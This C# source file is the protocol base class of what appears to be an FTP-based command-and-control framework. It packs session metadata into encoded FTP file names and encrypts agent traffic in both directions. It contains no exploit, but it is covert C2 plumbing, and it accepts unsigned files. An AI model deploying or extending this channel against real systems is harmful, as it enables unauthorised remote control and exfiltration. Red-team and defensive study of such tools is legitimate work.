using FtpC2;
using FtpC2.Responses;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

internal class ProtocolBase : IDisposable
{
    protected class PackedFileName
    {
        public string? Name { get; set; }
        public string? Version { get; set; }
        public Guid? Session { get; set; }
        public Guid? Uid { get; set; }
        public Guid? Signature { get; set; }
    }

    // If the protocol has evolved and is no longer backward compatible with previous versions,
    // please consider updating the following variable to the new protocol version. If the agent's
    // protocol and the Command and Control (C2) protocol don't align, the agent will be disregarded.
    private const string ProtocolVersion = "3.0.F";

    private bool _disposed = false;
    private readonly FtpHelper FTP;

    public delegate string DataModifierDelegate(string data);

    public DataModifierDelegate? IngressDataModifier;
    public DataModifierDelegate? EgressDataModifier;    

    public Guid? Session { set; get; }

    protected AsymEncryptionHelper? SelfEncryptionHelper;
    protected AsymEncryptionHelper? PeerEncryptionHelper;    

    public ProtocolBase(string host, string username, string password, bool secure)
    {
        this.FTP = new(host, username, password, secure);        
    }    

    protected string PackRemoteFileName(string remoteFileName, Guid session, Guid? uid, AsymEncryptionHelper? encryptionHelper)
    {
        PackedFileName packedFilename = new()
        {
            Name = remoteFileName,
            Session = session,
            Uid = uid,
            Signature = encryptionHelper?.GetPublicKeyFingerprint(),
            Version = ProtocolVersion,
        };

        string jsonData = JsonSerializer.Serialize(packedFilename, packedFilename.GetType());

        return Convert.ToBase64String(Encoding.UTF8.GetBytes(jsonData));
    }

    protected PackedFileName? UnpackRemoteFileName(string remoteFileName)
    {        
        try
        {
            string serializedClass = Encoding.UTF8.GetString(Convert.FromBase64String(remoteFileName));

            return JsonSerializer.Deserialize<PackedFileName>(serializedClass);
        }
        catch
        {
            return null;
        }
    }

    protected bool CanProcessFile(PackedFileName packedFileName, AsymEncryptionHelper? encryptionHelper)
    {
        if (packedFileName.Version != ProtocolVersion)
            return false;

        // More clean
        if (!packedFileName.Signature.HasValue)
            return true;

        Guid? pubSignature = encryptionHelper?.GetPublicKeyFingerprint();

        return /* !signature.HasValue || */ pubSignature == packedFileName.Signature;
    }

    public void SetupSelfEncryptionHelper(string publicKey, string privateKey)
    {
        SelfEncryptionHelper?.Dispose();

        SelfEncryptionHelper = new(
            Convert.FromBase64String(publicKey),
            Convert.FromBase64String(privateKey)
        );
    }

    public void SetupPeerEncryptionHelper(string publicKey)
    {
        PeerEncryptionHelper?.Dispose();

        PeerEncryptionHelper = new(Convert.FromBase64String(publicKey), null);
    }    

    public void UploadString(string content, string destFilePath)
    {
        content = EgressDataModifier != null ? EgressDataModifier.Invoke(content) : content;

        if (PeerEncryptionHelper != null)
            content = PeerEncryptionHelper.EncryptToJson(content);

        this.FTP.UploadString(content, destFilePath);
    }

    public string DownloadString(string remoteFilePath)
    {
        string content = this.FTP.DownloadString(remoteFilePath);

        if (SelfEncryptionHelper != null) 
            content = Encoding.UTF8.GetString(SelfEncryptionHelper.DecryptFromJson(content));

        content = IngressDataModifier != null ? IngressDataModifier.Invoke(content) : content;

        return content;
    }

    public List<string> ListDirectory(string remoteDirectoryPath = "")
    {
        return this.FTP.ListDirectory(remoteDirectoryPath);
    }

    public void CreateDirectory(string remoteDirectoryPath)
    {
        this.FTP.CreateDirectory(remoteDirectoryPath);
    }

    public void DeleteFile(string remoteDirectoryPath)
    {
        this.FTP.DeleteFile(remoteDirectoryPath);
    }

    public void Dispose()
    {
        Dispose(true);
        GC.SuppressFinalize(this);
    }

    protected virtual void Dispose(bool disposing)
    {
        if (_disposed)
            return;

        if (disposing)
        {
            SelfEncryptionHelper?.Dispose();
            PeerEncryptionHelper?.Dispose();            
        }

        _disposed = true;
    }
}